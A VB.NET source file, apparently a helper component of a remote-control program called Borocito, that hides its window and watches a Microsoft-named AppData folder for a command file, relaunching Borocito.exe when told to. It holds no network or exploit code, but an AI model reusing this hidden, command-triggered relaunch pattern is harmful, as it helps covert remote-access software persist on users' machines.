Imports System.IO
Imports Microsoft.Win32
Public Class Init
    Dim DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito"
    Dim WATCHER As FileSystemWatcher
    Dim UID As String
    Dim lastCommand As String
    Private Sub Init_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        Try
            LoadRegedit()
            WATCHER = New FileSystemWatcher()
            WATCHER.Path = DIRCommons
            WATCHER.Filter = "*.str"
            WATCHER.IncludeSubdirectories = False
            WATCHER.NotifyFilter = NotifyFilters.LastAccess Or NotifyFilters.LastWrite Or NotifyFilters.FileName Or NotifyFilters.DirectoryName Or NotifyFilters.Attributes
            AddHandler WATCHER.Changed, AddressOf MODIFICACION
            WATCHER.EnableRaisingEvents = True
            CheckForIllegalCrossThreadCalls = False
            Me.Hide()
        Catch ex As Exception
            Console.WriteLine("[Init_Load@Init]Error: " & ex.Message)
        End Try
    End Sub

    Public Sub MODIFICACION(source As Object, e As FileSystemEventArgs)
        If e.Name = "[" & UID & "]Command.str" Then
            ReadCommand()
        End If
    End Sub
    Sub LoadRegedit()
        Try
            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
            UID = regKey.GetValue("UID")
        Catch ex As Exception
            Console.WriteLine("[LoadRegedit@Init]Error: " & ex.Message)
            End
        End Try
    End Sub
    Sub ReadCommand()
        Try
            Dim filePath As String = DIRCommons & "\[" & UID & "]Command.str"
            Dim commandOne As String = IO.File.ReadAllLines(filePath)(1).Split(">"c)(1).Trim()
            If commandOne <> Nothing Then
                If lastCommand <> commandOne Then
                    If commandOne.StartsWith("broRescue") Then
                        If commandOne.Contains("Borocito") Then
                            Process.Start(DIRCommons & "\Borocito.exe")
                        End If
                    End If
                    lastCommand = commandOne
                End If
            End If
        Catch ex As Exception
            Console.WriteLine("[ReadCommand@Init]Error: " & ex.Message)
        End Try
    End Sub
End Class